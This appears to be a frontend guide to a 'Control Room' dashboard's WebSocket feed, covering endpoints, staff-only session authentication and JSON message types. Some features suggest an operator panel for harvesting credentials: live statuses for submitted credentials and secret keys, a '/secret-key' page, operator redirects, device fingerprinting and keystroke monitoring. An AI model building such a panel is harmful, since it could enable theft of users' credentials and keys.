

# 📘 **Control Room — Frontend WebSocket Integration Guide**


---

# 🔌 1. WebSocket Endpoints

### **Agent Dashboard (staff users only)**

```
ws://<host>/ws/control-room/
```

This is the **main real-time feed** for the dashboard.
All session activity across all users is streamed here.

### **User Session (end-user)**

```
ws://<host>/ws/session/<uuid>/
```

This is for the user’s device—not needed for agent dashboard UI.

---

# 🧠 2. Authentication

The backend uses:

* **Channels AuthMiddlewareStack**
* Django session cookie
* Must be signed in as `is_staff` or connect will be rejected with `4003`.

👉 **No tokens, no headers** — authentication is automatic.

---

# 📡 3. What the Dashboard WebSocket Sends

Here is the complete list of message types the frontend must expect on the dashboard socket (`/ws/control-room/`).

---

# 🔔 3.1 **connection_established**

Sent immediately after accepting the WebSocket.

```json
{
  "type": "connection_established",
  "message": "Connected to Control Room",
  "user": "admin"
}
```

Use it for debugging or UI health indicators.

---

# 🟢 3.2 **user_status**

Sent when a user:

* connects to their session
* disconnects
* submits an action that has a “status” field

**Shape:**

```json
{
  "type": "user_status",
  "uuid": "4fa2-...-aa91",
  "case_id": "19283",
  "status": "connected",
  "data": { "connected": true }
}
```

**Common status values:**

* `connected`
* `disconnected`
* `credentials_submitted`
* `secret_key_submitted`
* `kyc_submitted`

👉 Dashboard should update:

* Active sessions table
* User online badge
* Activity feed

---

# 🔄 3.3 **session_update**

Triggered by backend logic when session model changes.

```json
{
  "type": "session_update",
  "uuid": "4fa2-...-aa91",
  "case_id": "19283",
  "stage": "kyc",
  "user_online": true,
  "message": "Stage updated"
}
```

👉 Update:

* Stage badge
* Session row
* User online indicator

---

# 🚨 3.4 **control_message**

General broadcast messages for admin actions.

```json
{
  "type": "control_message",
  "message": "Redirected session 19283 to /kyc"
}
```

Use for system toast notifications.

---

# 📡 3.5 **broadcast**

Used by bulk delete or general commands.

```json
{
  "type": "broadcast",
  "event": "sessions_deleted",
  "data": { "uuids": ["...", "..."] }
}
```

---

# 📱 3.6 **device_metadata**

Sent when user client transmits device fingerprint or metadata.

```json
{
  "type": "device_metadata",
  "uuid": "4fa2...",
  "metadata": {
    "fingerprint": "BROWSER_ID",
    "browser": "Chrome",
    "platform": "Windows"
  }
}
```

---

# 🧭 3.7 **user_activity**

User typing, scrolling, idling, etc.

```json
{
  "type": "user_activity",
  "uuid": "4fa2...",
  "activity": "typing",
  "data": { "chars": 3 }
}
```

👉 Use to update:

* “Typing Now” count
* Real-time activity indicators

---

# 🚀 3.8 **session_started**

User has loaded the client + device fingerprinting initialized.

```json
{
  "type": "session_started",
  "uuid": "4fa2...",
  "data": { "fingerprint": "abc123" }
}
```

---

# 📍 3.9 **page_view**

Track user navigation inside the flow.

```json
{
  "type": "page_view",
  "uuid": "4fa2...",
  "data": { "page": "/secret-key" }
}
```

---

# 🧩 Summary Table — All Message Types

| Type                   | Used For                        |
| ---------------------- | ------------------------------- |
| connection_established | Initial handshake               |
| user_status            | Online/offline, submitted forms |
| session_update         | Stage/status updates            |
| control_message        | Server system messages          |
| broadcast              | Multicast utility events        |
| device_metadata        | Device fingerprint data         |
| user_activity          | Typing/scroll/idle              |
| session_started        | Beginning of user workflow      |
| page_view              | Navigation inside the flow      |

---